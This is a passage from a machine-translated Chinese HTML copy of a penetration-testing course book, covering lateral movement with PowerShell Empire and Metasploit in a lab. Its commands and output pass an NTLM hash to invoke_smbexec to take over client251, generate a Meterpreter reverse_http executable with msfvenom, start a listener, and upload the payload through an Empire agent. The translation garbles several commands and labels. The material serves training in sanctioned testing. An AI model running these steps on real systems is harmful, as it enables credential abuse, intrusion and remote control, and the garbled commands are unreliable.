<div style="position:absolute;top:144947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: K678VC13) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usemodulelateral_movement/</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术</font></font></nobr></div>
<div style="position:absolute;top:144964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inveigh_relay    </font></font></nobr></div>
<div style="position:absolute;top:144964;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">invoke_psremoting invoke_wmi</font></font></nobr></div>
<div style="position:absolute;top:144981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">invoke_dcom    </font></font></nobr></div>
<div style="position:absolute;top:144981;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">invoke_smbexec    </font></font></nobr></div>
<div style="position:absolute;top:144981;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">invoke_wmi_debugger </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:145111;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="123"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 123 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:145144;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:146221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:146221;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:146221;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">740</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:145240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">invoke_executemsbuild invoke_sqloscmd    </font></font></nobr></div>
<div style="position:absolute;top:145240;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jenkins_script_console</font></font></nobr></div>
<div style="position:absolute;top:145256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">invoke_psexec    </font></font></nobr></div>
<div style="position:absolute;top:145256;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">invoke_sshcommand new_gpo_immediate_task</font></font></nobr></div>
<div style="position:absolute;top:145276;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 844 - 横向运动技术</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:145306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为一个例子，我们将尝试</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">invoke_smbexec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，它需要几个参数。</font></font></nobr></div>
<div style="position:absolute;top:145338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ComputerName</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为 Windows 10 客户端 (client251) 的主机名，并将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Listener</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为</font></font></nobr></div>
<div style="position:absolute;top:145358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“http”。</font><font style="vertical-align: inherit;">我们还将</font><font style="vertical-align: inherit;">使用来自的相关数据</font><font style="vertical-align: inherit;">设置</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Username</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Domain</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hash</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font></font></nobr></div>
<div style="position:absolute;top:145377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上一节中找到</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jeff_admin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐户（清单 843）。</font><font style="vertical-align: inherit;">这是在 (Listing</font></font></nobr></div>
<div style="position:absolute;top:145396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 845 章</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:145458;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用 set CredID 命令来指定条目的 ID 号</font></font></i></nobr></div>
<div style="position:absolute;top:145477;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从凭证存储或手动输入所有凭证。</font><font style="vertical-align: inherit;">注意，在这个</font></font></i></nobr></div>
<div style="position:absolute;top:145497;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，Offsec 和 Jeff_admin 的密码是一致的。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:145561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: K678VC13) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usemodulelateral_movement/invoke_smbexec</font></font></font></b></nobr></div>
<div style="position:absolute;top:145595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：powershell/lateral_movement/invoke_smbexec）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b></nobr></div>
<div style="position:absolute;top:145629;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：调用-SMBExec</font></font></nobr></div>
<div style="position:absolute;top:145646;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块：powershell/lateral_movement/invoke_smbexec</font></font></nobr></div>
<div style="position:absolute;top:145663;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NeedsAdmin：错误</font></font></nobr></div>
<div style="position:absolute;top:145680;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpsecSafe：真</font></font></nobr></div>
<div style="position:absolute;top:145697;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语言：powershell</font></font></nobr></div>
<div style="position:absolute;top:145714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最小语言版本：2</font></font></nobr></div>
<div style="position:absolute;top:145731;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景：错误</font></font></nobr></div>
<div style="position:absolute;top:145747;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出扩展：无</font></font></nobr></div>
<div style="position:absolute;top:145782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:145816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:145849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:145849;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所需值    </font></font></nobr></div>
<div style="position:absolute;top:145849;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></nobr></div>
<div style="position:absolute;top:145866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:145866;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">——————————————————</font></font></nobr></div>
<div style="position:absolute;top:145884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信用证错误    </font></font></nobr></div>
<div style="position:absolute;top:145884;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CredID 从商店使用。    </font></font></nobr></div>
<div style="position:absolute;top:145900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计算机名 真    </font></font></nobr></div>
<div style="position:absolute;top:145900;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 [s] 执行 stager，逗号 </font></font></nobr></div>
<div style="position:absolute;top:145917;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分开了。    </font></font></nobr></div>
<div style="position:absolute;top:145934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务错误    </font></font></nobr></div>
<div style="position:absolute;top:145934;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要创建和删除的服务的名称。   </font></font></nobr></div>
<div style="position:absolute;top:145951;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认为 20 个字符随机。    </font></font></nobr></div>
<div style="position:absolute;top:145968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyCreds False 默认代理凭据    </font></font></nobr></div>
<div style="position:absolute;top:145985;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">([domain\]username:password) 用于 </font></font></nobr></div>
<div style="position:absolute;top:146002;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求（默认、无或其他）。    </font></font></nobr></div>
<div style="position:absolute;top:146019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名 真    </font></font></nobr></div>
<div style="position:absolute;top:146019;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名。    </font></font></nobr></div>
<div style="position:absolute;top:146036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域错误    </font></font></nobr></div>
<div style="position:absolute;top:146036;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。    </font></font></nobr></div>
<div style="position:absolute;top:146053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希    </font></font></nobr></div>
<div style="position:absolute;top:146053;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:146053;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LM:NTLM 或 NTLM 格式的 NTLM 哈希。    </font></font></nobr></div>
<div style="position:absolute;top:146070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理人    </font></font></nobr></div>
<div style="position:absolute;top:146070;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:146070;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">K678VC13 代理运行模块。    </font></font></nobr></div>
<div style="position:absolute;top:146087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听者真    </font></font></nobr></div>
<div style="position:absolute;top:146087;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要使用的侦听器。    </font></font></nobr></div>
<div style="position:absolute;top:146104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...    </font></font></nobr></div>
<div style="position:absolute;top:146138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: powershell/lateral_movement/invoke_smbexec) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 ComputerName client251</font></font></font></b></nobr></div>
<div style="position:absolute;top:146172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: powershell/lateral_movement/invoke_smbexec) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置监听器 http</font></font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:146299;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="124"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 124 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:146332;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:147409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:147409;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:147409;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">741</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:146444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: powershell/lateral_movement/invoke_smbexec) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置用户名 jeff_admin</font></font></font></b></nobr></div>
<div style="position:absolute;top:146478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: powershell/lateral_movement/invoke_smbexec) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置哈希 e2b475c11da2a0748290d8</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:146496;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7aa966c327</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:146529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: powershell/lateral_movement/invoke_smbexec) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置域corp.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:146563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：powershell/lateral_movement/invoke_smbexec）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b></nobr></div>
<div style="position:absolute;top:146580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 client251 上使用服务 CVTERKCMPMMECQLRWLKB 执行的命令</font></font></nobr></div>
<div style="position:absolute;top:146614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 将 POWERSHELL stager（阶段 1）发送到 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:146631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 新代理 UXVZ2NC3 签入</font></font></nobr></div>
<div style="position:absolute;top:146648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22 的初始代理 UXVZ2NC3 现在处于活动状态（Slack）</font></font></nobr></div>
<div style="position:absolute;top:146665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:146684;left:268"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 845 - 使用 PowerShell Empire 执行横向移动</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:146714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的！</font><font style="vertical-align: inherit;">代理已成功部署，我们现在可以与其进行交互：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:146749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(帝国：K678VC13) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特工</font></font></font></b></nobr></div>
<div style="position:absolute;top:146783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 活跃代理：</font></font></nobr></div>
<div style="position:absolute;top:146817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Name Lang 内部 IP 机器名 Username 进程    </font></font></nobr></div>
<div style="position:absolute;top:146817;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">延迟</font></font></nobr></div>
<div style="position:absolute;top:146834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------- ---- ----------- ------------ --------- ----- ——    </font></font></nobr></div>
<div style="position:absolute;top:146834;left:749"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----</font></font></nobr></div>
<div style="position:absolute;top:146851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S2Y5XW1L ps 10.11.0.22 CLIENT251 corp\offsec powershell/2976 5/0.0</font></font></nobr></div>
<div style="position:absolute;top:146867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DWZ49BAP ps 10.11.0.22 CLIENT251 corp\offsec explorer/3568 5/0.0</font></font></nobr></div>
<div style="position:absolute;top:146884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">K678VC13 ps 10.11.0.22 CLIENT251 *corp\offsec powershell/6236 5/0.0</font></font></nobr></div>
<div style="position:absolute;top:146902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UXVZ2NC3 ps 10.11.0.22 CLIENT251 *corp\SYSTEM powershell/3912 5/0.0</font></font></nobr></div>
<div style="position:absolute;top:146935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：特工）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互 UXVZ2NC3</font></font></font></b></nobr></div>
<div style="position:absolute;top:146952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：UXVZ2NC3）&gt; </font></font></nobr></div>
<div style="position:absolute;top:146972;left:246"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 846 - 列出新的 PowerShell Empire 代理并与之交互</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:147005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.3 在 Empire 和 Metasploit 之间切换</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:147047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Empire 代理支持许多功能。</font><font style="vertical-align: inherit;">但是，很多时候我们需要使用</font></font></nobr></div>
<div style="position:absolute;top:147066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅在 Metasploit 中发现的功能。</font><font style="vertical-align: inherit;">因为我们可以同时拥有 Empire 和 Metasploit shell</font></font></nobr></div>
<div style="position:absolute;top:147086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同一个被入侵的主机，这其实很容易。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:147148;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 PowerShell Empire 2.4 版中，可以使用 Meterpreter 侦听器</font></font></i></nobr></div>
<div style="position:absolute;top:147167;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和injectshellcode模块直接注入一个meterpreter shellcode</font></font></i></nobr></div>
<div style="position:absolute;top:147187;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 PowerShell 的内存。</font><font style="vertical-align: inherit;">但是，在最新版本 (2.5) 中，此代码是</font></font></i></nobr></div>
<div style="position:absolute;top:147206;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是坏了。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:147268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 PowerShell Empire 代理在主机上处于活动状态，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成一个</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">Meterpreter</font></font></b></font></nobr></div>
<div style="position:absolute;top:147287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 shell 反向作为可执行文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:147322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:147339;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">f exe -o 遇见.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:147356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择平台，从有效负载中选择 Msf::Module::Platform::Windows </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:147487;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="125"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 125 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:147520;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:148597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:148597;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:148597;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">742</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:147616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择 arch，从有效载荷中选择 arch: x86</font></font></nobr></div>
<div style="position:absolute;top:147632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未指定编码器或 badchars，输出原始负载</font></font></nobr></div>
<div style="position:absolute;top:147649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：633 字节</font></font></nobr></div>
<div style="position:absolute;top:147666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe文件的最终大小：73802字节</font></font></nobr></div>
<div style="position:absolute;top:147684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另存为：met.exe</font></font></nobr></div>
<div style="position:absolute;top:147703;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 847 - 生成 Meterpreter 有效负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:147732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后我们使用 multi/handler 模块和先前选择的设置一个 Metasploit 监听器</font></font></nobr></div>
<div style="position:absolute;top:147752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:147786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 multi/handler</font></font></font></b></nobr></div>
<div style="position:absolute;top:147820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置有效载荷 windows/meterpreter/reverse_http</font></font></font></b></nobr></div>
<div style="position:absolute;top:147837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷 =&gt; windows/meterpreter/reverse_http</font></font></nobr></div>
<div style="position:absolute;top:147871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 7777</font></font></font></b></nobr></div>
<div style="position:absolute;top:147888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LPORT =&gt; 7777</font></font></nobr></div>
<div style="position:absolute;top:147922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:147939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:147973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:148007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 http://10.11.0.4:7777 上启动 HTTP 反向处理程序</font></font></nobr></div>
<div style="position:absolute;top:148026;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 848 - Metasploit 侦听器捕获反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:148056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们切换回我们的 PowerShell Empire shell 并上传可执行文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:148090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帝国：S2Y5XW1L) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传/home/kali/met.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:148108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 委托代理上传met.exe，72 KB</font></font></nobr></div>
<div style="position:absolute;top:148125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 委托 S2Y5XW1L 运行 TASK_UPLOAD</font></font></nobr></div>
<div style="position:absolute;top:148141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 特工 S2Y5XW1L 的任务 ID 为 12</font></font></nobr></div>
<div style="position:absolute;top:148158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 特工 S2Y5XW1L 返回结果。</font></font></nobr></div>
<div style="position:absolute;top:148175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22 返回的有效结果 </font></font></nobr></div>
<div style="position:absolute;top:148210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Empire: S2Y5XW1L) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell 目录</font></font></font></b></nobr></div>
<div style="position:absolute;top:148226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 委托 S2Y5XW1L 运行 TASK_SHELL</font></font></nobr></div>
